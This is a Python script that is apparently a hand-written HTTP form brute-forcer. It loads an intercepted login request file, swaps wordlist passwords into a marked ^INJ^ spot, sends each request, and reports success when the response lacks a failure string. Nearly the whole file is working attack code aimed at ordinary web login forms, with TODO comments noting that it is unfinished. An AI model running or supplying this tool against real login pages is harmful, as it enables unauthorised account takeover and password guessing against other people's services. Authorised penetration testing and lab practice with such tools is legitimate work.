#!/usr/bin/python3

#####################################################
# http form post brute forcer
# manual recon needed, intercept a post req, save to file
# based on burp req/post syntaxes
# use ^INJ^ to mark password injection point
# 
# -iamgroot
######################################################

# how can this be multi threaded for speed?

import sys
import requests
import string


##################################
# connection and payload handler #
# send password, return response #
##################################
# TODO: use diff requests depending on method
# TODO: either parse req file here to replace with pw everytime (redundant) or remember the previous pw and replace that every time (possible collision with other headers)
# TODO: header needs find and replace 
# TODO: auto detect coding type and change data/req accordingly
def send_p(pw):
	tmpurl = url.replace("^INJ^",pw)
	tmpheader = header
	tmpbody = body.replace("^INJ^",pw)
#	for i in tempheader:
#	payload = ""
	if meth == "POST":
		try:
			r = requests.post(tmpurl, headers=tmpheader, data=tmpbody, timeout=5)			# 5 sec timeout
# params=data,headers=headers
# if in get req?
		except:
			print("Could not send payload...")
			sys.exit(0)
#	print(str(r.status_code) + r.text)													# debug info
	return(str(r.status_code) + r.text)

########
# main #
########

# check args
try:
	req_file = open(sys.argv[1], "r")
	wordlist_file = open(sys.argv[2], "r")
except:
	print(f"Usage: {sys.argv[0]} <POST request file with ^INJ^> <wordlist> [<invalid pw string, case sens. (\"Invalid\")>]")
	sys.exit(0)
try:
	invalid = sys.argv[3]
except:
	invalid = "Invalid"

# open files and assign to vars
req = req_file.read().splitlines()
req_file.close()
wl = wordlist_file.read().splitlines()
wordlist_file.close()

# all the vars
meth = ""
url = ""
ip = ""
port = ""
path = ""
host = ""
header = {}
body = ""
cont = ""
inj = 0
brk = 0

# check for ^INJ^ marker and content type
for i in req:
	if "^INJ^" in i:
		inj = 1
	if "content-type" in i.lower():
		cont = i.split('/')[1]

if inj == 0:
	print("No injection point (^INJ^) found in request file.")
	sys.exit(0)

# extract all necessary info 
for i in req:
	if brk == 1:
		body += i
	elif "POST" in i or "GET" in i:
		meth = i.split(' ')[0]
		path = i.split(' ')[1]
	elif "host:" in i.lower():
		host = i.split(' ')[-1]
		ip = str(host.split(':')[0])
		try:
			port = str(host.split(':')[1])
		except:
			port = "80"
		if port == "443":
			url = "https://"
		else:
			url = "http://"
	elif i == "":
		brk = 1
	else:
		header[f"{i.split(': ')[0]}"] = i.split(': ')[-1]

url += host + path


# start attack
print("Attacking: " + url)
print("Assuming a timeout of 5s = redirect or right password...\n")
	
# read WL line by line and try req
for i in wl:
	print("                                         \r",end='')
	print("Trying password: " + i + "\r",end='')
	resp = send_p(i)
	if not invalid in resp:
		print("\nPassword found: " + i)
		if "Content" in header:
			print("found")
		sys.exit(0)

# end attack
print("No password found in list (or something went wrong).")


# print all the relevant variables for debug		
'''
print("method: " + meth)
print("url: " + url)
print("ip: " + ip)
print("port: " + port)
print("path: " + path)
print("host: " + host)
print("header: " , header)
print("body: " + body)
'''
